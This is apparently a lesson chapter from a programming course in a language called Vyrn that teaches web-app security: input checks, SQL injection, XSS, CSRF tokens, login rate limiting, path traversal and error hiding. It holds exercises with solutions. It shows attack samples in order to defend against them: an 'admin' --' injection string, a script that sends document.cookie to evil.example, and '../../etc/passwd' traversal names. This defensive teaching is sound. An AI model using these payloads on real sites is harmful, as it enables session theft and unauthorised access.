# Day 51: Security

Every web app on the internet is attacked, constantly, mostly by automated
programs trying the same few tricks on millions of sites. The good news:
the common attacks have well-known defences, and you've already met most
of them. Today you meet each attack properly, see it work against a
careless app, and close it. The project secures the blog from Day 50.

## 51.1 Rule one: never trust input

Everything that arrives from outside is **untrusted**: form fields, the
query string, the path, headers, cookies, JSON bodies, uploaded files.
Anyone can send anything, without using your forms at all. So the server
checks everything, every time:

```vyrn
struct BadRequest:
    message: str
end

create check_signup(name: str, age: str, email: str) -> (str, int, str):
    let n = name.strip()
    if not (2 <= len(n) <= 30): fail BadRequest("names are 2 to 30 letters")
    if not all(c.isalnum() or c in "_-" each c in n): fail BadRequest("names use letters, digits, _ and - only")
    var a = 0
    attempt:
        a = int(age)
    catch ValueError:
        fail BadRequest("age must be a number")
    end
    if not (13 <= a <= 120): fail BadRequest("age must be 13 to 120")
    let parts = email.strip().split("@")
    if len(parts) != 2 or "." not in parts[1]: fail BadRequest("that isn't an email address")
    return (n, a, email.strip().lower())
end

main:
    print(check_signup(" ada_l ", "36", "Ada@Mail.com"))
    each name, age, email in [("a", "20", "x@y.z"), ("<script>", "20", "x@y.z"), ("bob", "-5", "x@y.z"), ("bob", "20", "nope")]:
        attempt:
            check_signup(name, age, email)
        catch BadRequest as e:
            print(e.message)
        end
    end
end
```

```text
("ada_l", 36, "ada@mail.com")
names are 2 to 30 letters
names use letters, digits, _ and - only
age must be 13 to 120
that isn't an email address
```

Check against what's **allowed** ("letters, digits, _ and -"), not against
what's forbidden: attackers are better at inventing bad input than you are
at listing it.

## 51.2 SQL injection

On Day 38 you saw text joined into SQL change the meaning of a query. Here
is the attack that matters most: a login form that joins text, beaten
without knowing any password.

```vyrn
use vyrn.db

create careless_login(conn: any, name: str, password: str) -> bool:
    let sql = "select count(*) from users where name = '" + name + "' and password = '" + password + "'"
    return conn.value(sql) > 0
end

create safe_login(conn: any, name: str, password: str) -> bool:
    return conn.value("select count(*) from users where name = ? and password = ?", [name, password]) > 0
end

main:
    let conn = db.open(":memory:")
    conn.execute("create table users (name text, password text)")
    conn.execute("insert into users values ('admin', 'k8#Lp!x2')")
    let attack = "admin' --"
    print("careless:", careless_login(conn, attack, "anything"))
    print("safe:", safe_login(conn, attack, "anything"))
end
```

```text
careless: true
safe: false
```

`admin' --` closes the name's quote and turns the rest of the query, the
password check, into a comment (`--`). With `?` placeholders the database
never treats the input as SQL. The rule has no exceptions: **never build
SQL by joining text**. (And never store plain passwords like this table
does: Day 49.)

## 51.3 Cross-site scripting (XSS)

If a page includes what a visitor typed without escaping it, the visitor
can add their own `<script>`, which then runs in *every other visitor's*
browser, able to read their page and act as them:

```vyrn
use vyrn.html
use vyrn.template

main:
    let comment = "Nice post!<script>fetch('https://evil.example/?c=' + document.cookie)</script>"
    print("careless: <p>" + comment + "</p>")
    print("escaped:  <p>" + html.escape(comment) + "</p>")
    print("template: " + template.render(r"<p>{{c}}</p>", {"c": comment}))
end
```

```text
careless: <p>Nice post!<script>fetch('https://evil.example/?c=' + document.cookie)</script></p>
escaped:  <p>Nice post!&lt;script&gt;fetch(&#39;https://evil.example/?c=&#39; + document.cookie)&lt;/script&gt;</p>
template: <p>Nice post!&lt;script&gt;fetch(&#39;https://evil.example/?c=&#39; + document.cookie)&lt;/script&gt;</p>
```

Escaped, the script is just text on the page. Templates escape `{{x}}` for
you; `{{{x}}}` and joining strings don't. And `HttpOnly` cookies (Day 49)
mean that even a script that slips through can't read the session cookie.

A second wall: a **Content-Security-Policy** header tells the browser to
run only scripts from your own site, so injected inline scripts are
refused even if one gets onto the page:

```vyrn
use vyrn.http

const SECURE = {
    "Content-Security-Policy": "default-src 'self'",
    "X-Content-Type-Options": "nosniff",
    "Referrer-Policy": "same-origin",
}

create security_headers(request, next):
    let r = next(request)
    if r is str: return http.Response(200, r, SECURE)
    return r
end

route GET "/" ():
    return "<h1>Hi</h1>"
end

main:
    http.use(security_headers)
    print(http.test("GET", "/").headers["content-security-policy"])
end
```

```text
default-src 'self'
```

## 51.4 Cross-site request forgery (CSRF)

While you're logged in to your bank, a page on another site can contain a
hidden form that posts to the bank. Your browser sends your cookies with
it, so the bank thinks you sent it. `SameSite=Lax` cookies (Day 49) stop
most of this; the full defence is a **CSRF token**: a random value the
server puts in its own forms and checks on every POST. A form on another
site can't know it:

```vyrn
use vyrn.crypto
use vyrn.http

route GET "/transfer" (request, tokens):
    let sid = request.cookies.get("session", "")
    let token = crypto.token(16)
    tokens[sid] = token
    return "<form method=\"post\"><input type=\"hidden\" name=\"csrf\" value=\"{token}\"><input name=\"amount\"><button>Send</button></form>"
end

route POST "/transfer" (amount: int, request, tokens, csrf: str = ""):
    let expected = tokens.get(request.cookies.get("session", ""), "")
    if expected == "" or not crypto.same(csrf, expected): return http.Response(403, "Missing or wrong form token.")
    return "sent {amount}"
end

main:
    http.provide("tokens", {})
    let me = {"Cookie": "session=s1"}
    let page = http.test("GET", "/transfer", headers = me).text
    let token = page.split("value=\"")[1].split("\"")[0]
    print(http.test("POST", "/transfer", form = {"amount": "50", "csrf": token}, headers = me).text)
    print(http.test("POST", "/transfer", form = {"amount": "5000"}, headers = me).status)
end
```

```text
sent 50
403
```

The second request is what the other site's hidden form would send: the
right cookie, but no token, so it's refused.

### Exercise

Logins are attacked by programs guessing passwords. Write
`allow_attempt(attempts, name, now)`: it keeps a list of recent failure
times per name, and refuses (false) when there have been 5 or more in the
last 15 minutes (900 seconds). Record each call as an attempt.

```vyrn starter
create allow_attempt(attempts: map, name: str, now: float) -> bool:
    return true
end

main:
    var attempts = {}
    print([allow_attempt(attempts, "ada", 100.0 + i) each i in 0 until 6])
    print(allow_attempt(attempts, "ada", 2000.0), allow_attempt(attempts, "bob", 106.0))
end
```

```text expect
[true, true, true, true, true, false]
true true
```

> Hint: keep only the times within 900 seconds of `now`:
> `[t each t in attempts.get(name, []) if now - t < 900]`.
> Hint: refuse if 5 or more remain; otherwise add `now` and allow.

<details><summary>Solution</summary>

```vyrn solution
create allow_attempt(attempts: map, name: str, now: float) -> bool:
    let recent = [t each t in attempts.get(name, []) if now - t < 900]
    if len(recent) >= 5:
        attempts[name] = recent
        return false
    end
    attempts[name] = recent + [now]
    return true
end

main:
    var attempts = {}
    print([allow_attempt(attempts, "ada", 100.0 + i) each i in 0 until 6])
    print(allow_attempt(attempts, "ada", 2000.0), allow_attempt(attempts, "bob", 106.0))
end
```

</details>

## 51.5 Paths and files

A route that serves files by name must not let the name escape the folder:
`../../etc/passwd` walks up and out. Resolve the full path and check it's
still inside:

```vyrn
use vyrn.path

create safe_file(folder: str, name: str) -> str?:
    let base = path.absolute(folder)
    let full = path.absolute(path.join(folder, name))
    if not full.startswith(base + "/"): return none
    return full
end

main:
    print(safe_file("uploads", "cat.png") != none)
    print(safe_file("uploads", "../../etc/passwd"))
    print(safe_file("uploads", "/etc/passwd"))
end
```

```text
true
none
none
```

## 51.6 Secrets and errors

Two last habits:

- **Secrets stay out of code** (Day 35): keys, passwords and signing keys
  come from environment variables or a `.env` file that Git ignores.
- **Errors don't tell attackers things.** A visitor sees "Something went
  wrong"; the details go to your log. Vyrn's server sends `500` errors as
  `{"error": "ServerError", ...}` without the program's insides, and you
  can log the details in a middleware.

| Attack | Defence | Day |
|---|---|---|
| bad input | check against what's allowed, on the server | 43, 51 |
| SQL injection | `?` placeholders, always | 38, 51 |
| XSS | escape output (`{{x}}`), `HttpOnly`, Content-Security-Policy | 41, 49, 51 |
| CSRF | `SameSite` cookies, CSRF tokens | 49, 51 |
| stolen password table | `crypto.hash_password` | 49 |
| password guessing | limit attempts | 51 |
| path traversal | resolve and check paths | 51 |
| leaked keys | environment variables, `.gitignore` | 35 |

### Exercise

Write a middleware that turns any failure in a route into a plain `500`
page saying "Something went wrong", while recording the real message in
a `log` list it's given.

```vyrn starter
use vyrn.http

route GET "/boom" ():
    fail ValueError("the database password is hunter2")
end

main:
    var log = []
    print(http.test("GET", "/boom").text)
end
```

```text expect
500 Something went wrong
["ValueError: the database password is hunter2"]
```

> Hint: a function that takes `log` and gives the middleware:
> `create hide_errors(log: list) -> any:` with `create middleware(request, next):` inside.
> Hint: inside, `attempt: return next(request)`, and in `catch Error as e:`
> append `str(e)` to `log` and return `http.Response(500, "Something went wrong")`.

<details><summary>Solution</summary>

```vyrn solution
use vyrn.http

route GET "/boom" ():
    fail ValueError("the database password is hunter2")
end

create hide_errors(log: list) -> any:
    create middleware(request, next):
        attempt:
            return next(request)
        catch Error as e:
            log.append(str(e))
            return http.Response(500, "Something went wrong")
        end
    end
    return middleware
end

main:
    var log = []
    http.use(hide_errors(log))
    let r = http.test("GET", "/boom")
    print(r.status, r.text)
    print(log)
end
```

</details>

## Today you learned

- Never trust input; check it against what's allowed, on the server.
- `?` placeholders stop SQL injection; escaping stops XSS; HttpOnly,
  SameSite and CSRF tokens protect sessions.
- Security headers like Content-Security-Policy add a second wall.
- Limit login attempts, keep file paths inside their folder, keep secrets
  out of code, and keep error details out of responses.
